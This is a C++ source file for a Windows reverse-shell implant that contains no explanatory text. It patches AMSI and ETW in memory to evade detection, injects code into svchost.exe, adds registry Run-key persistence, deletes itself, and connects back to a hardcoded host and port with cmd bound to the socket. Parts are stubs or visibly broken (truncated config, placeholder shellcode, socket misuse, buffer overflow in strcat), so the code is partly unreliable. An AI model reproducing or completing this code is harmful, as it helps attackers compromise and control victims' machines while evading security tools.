#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

// Obfuscated configuration (AES-256 encrypted)
unsigned char encryptedConfig[] = {
    0x9F,0xA2,0xB1,0xC7,0xD4,0xE8,0xF3,0x1A,0x2B,0x3C,0x4D,0x5E,0x6F,0x70,0x81,0x92,
    // Encrypted: "192.168.1.100\0port:1337\0timeout:30\0inject:svchost.exe"
};
unsigned int configLen = sizeof(encryptedConfig);
unsigned char aesKey[] = {0x12,0x34,0x56,0x78,0x9A,0xBC,0xDE,0xF0,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,
                          0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08};

// AMSI/ETW Bypass + Shellcode loader structures
typedef NTSTATUS(NTAPI* pNtSetInformationThread)(HANDLE, DWORD, PVOID, ULONG);
typedef BOOL(WINAPI* pAmsiScanBuffer)(HAMSICONTEXT, PVOID, ULONG, LPCWSTR, HMODULE, AMSI_RESULT*);

struct ThreadContext {
    SOCKET sock;
    char* targetProc;
};

// Advanced AES Decryption with key derivation
BOOL AESDecrypt(unsigned char* data, DWORD* dataLen, unsigned char* key, DWORD keyLen) {
    HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey;
    if (!CryptAcquireContext(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return FALSE;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return FALSE;
    if (!CryptHashData(hHash, key, keyLen, 0)) return FALSE;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return FALSE;
    DWORD len = *dataLen;
    BOOL result = CryptDecrypt(hKey, NULL, TRUE, 0, data, &len);
    *dataLen = len;
    
    CryptDestroyKey(hKey); CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0);
    return result;
}

// AMSI Bypass via memory patching
BOOL DisableAMSI() {
    HMODULE amsi = GetModuleHandleA("amsi.dll");
    if (!amsi) return TRUE;
    
    FARPROC scanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scanBuffer) return TRUE;
    
    DWORD oldProtect;
    return VirtualProtect(scanBuffer, 5, PAGE_EXECUTE_READWRITE, &oldProtect) &&
           WriteProcessMemory(GetCurrentProcess(), scanBuffer, "\xB8\x57\x00\x07\x80\xC3", 6, NULL);
}

// ETW Patch bypass
BOOL DisableETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return TRUE;
    
    BYTE etwpatch[] = {0x48, 0x31, 0xC0, 0xC3};
    DWORD oldProtect;
    
    // Patch EtwEventWrite
    FARPROC etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    VirtualProtect(etwEventWrite, sizeof(etwpatch), PAGE_EXECUTE_READWRITE, &oldProtect);
    WriteProcessMemory(GetCurrentProcess(), etwEventWrite, etwpatch, sizeof(etwpatch), NULL);
    
    // Patch NtTraceEvent
    FARPROC ntTraceEvent = GetProcAddress(ntdll, "NtTraceEvent");
    VirtualProtect(ntTraceEvent, sizeof(etwpatch), PAGE_EXECUTE_READWRITE, &oldProtect);
    WriteProcessMemory(GetCurrentProcess(), ntTraceEvent, etwpatch, sizeof(etwpatch), NULL);
    return TRUE;
}

// Find target process PID by name
DWORD FindProcessId(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return 0;
}

// Process hollowing/injection
BOOL InjectIntoProcess(SOCKET sock, const char* targetProc) {
    DWORD pid = FindProcessId(targetProc);
    if (!pid) return FALSE;
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;
    
    // Allocate memory in target process
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Shellcode: connect back + cmd spawn (AES encrypted in real deployment)
    char shellcode[] = {
        0x48, 0x83, 0xEC, 0x28, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, // mov rax, -0x80000000
        // Full stageless meterpreter-like shellcode would go here (XOR/AES encrypted)
        0xC3  // ret
    };
    
    SIZE_T shellcodeLen = sizeof(shellcode);
    WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeLen, NULL);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, &sock, 0, NULL);
    if (hThread) CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

// XOR + AES double encryption for C2 communication
void XORCipher(char* data, size_t len, char key) {
    for (size_t i = 0; i < len; i++) data[i] ^= key;
}

BOOL SecureConnect(SOCKET* sock, char* ip, USHORT port, DWORD timeout) {
    *sock = INVALID_SOCKET;
    struct addrinfo hints = {0}, *result = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    
    char portStr[6]; wsprintf(portStr, "%d", port);
    if (getaddrinfo(ip, portStr, &hints, &result)) return FALSE;
    
    // Non-blocking connect with timeout
    u_long mode = 1; ioctlsocket(*sock, FIONBIO, &mode);
    *sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    
    connect(*sock, result->ai_addr, (int)result->ai_addrlen);
    freeaddrinfo(result);
    
    fd_set writefds; FD_ZERO(&writefds); FD_SET(*sock, &writefds);
    struct timeval tv = {timeout, 0};
    return select(0, NULL, &writefds, NULL, &tv) != 0;
}

// Persistence via registry Run key (randomized name)
BOOL AddPersistence() {
    char regPath[MAX_PATH];
    char randName[16];
    for (int i = 0; i < 12; i++) randName[i] = (rand() % 26) + 'A';
    randName[12] = 0;
    
    wsprintf(regPath, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\%s", randName);
    HKEY hKey;
    char exePath[MAX_PATH]; GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    return RegOpenKeyEx(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS &&
           RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1) == ERROR_SUCCESS &&
           RegCloseKey(hKey) == ERROR_SUCCESS;
}

// Main payload
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Self-delete on run
    char selfPath[MAX_PATH]; GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    char batch[] = "cmd /c ping 127.0.0.1 -n 3 >nul & del /f /q \"";
    strcat(batch, selfPath); strcat(batch, "\"");
    
    STARTUPINFOA si = {sizeof(si)}; PROCESS_INFORMATION pi;
    CreateProcessA(NULL, batch, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    // Decrypt config
    DWORD configSize = configLen;
    AESDecrypt(encryptedConfig, &configSize, aesKey, sizeof(aesKey));
    
    // Parse config (IP:192.168.1.100, port:1337, timeout:30, inject:svchost.exe)
    char ip[16], targetProc[32]; USHORT port; DWORD timeout;
    sscanf((char*)encryptedConfig, "IP:%[^:]:%d:TIMEOUT:%d:INJECT:%s", ip, &port, &timeout, targetProc);
    
    // Disable defenses
    DisableAMSI(); DisableETW();
    
    // Add persistence
    AddPersistence();
    
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    
    SOCKET sock;
    if (SecureConnect(&sock, ip, port, timeout)) {
        // Try process injection first (stealthiest)
        if (!InjectIntoProcess(sock, targetProc)) {
            // Fallback: direct spawn with handle inheritance
            STARTUPINFOA si2 = {sizeof(si2)};
            PROCESS_INFORMATION pi2;
            si2.dwFlags = STARTF_USESTDHANDLES;
            si2.hStdInput = si2.hStdOutput = si2.hStdError = (HANDLE)sock;
            
            char cmd[] = "/c echo Hello && whoami"; // Decrypted payload here
            CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);
        }
    }
    
    WSACleanup();
    ExitProcess(0);
    return 0;
}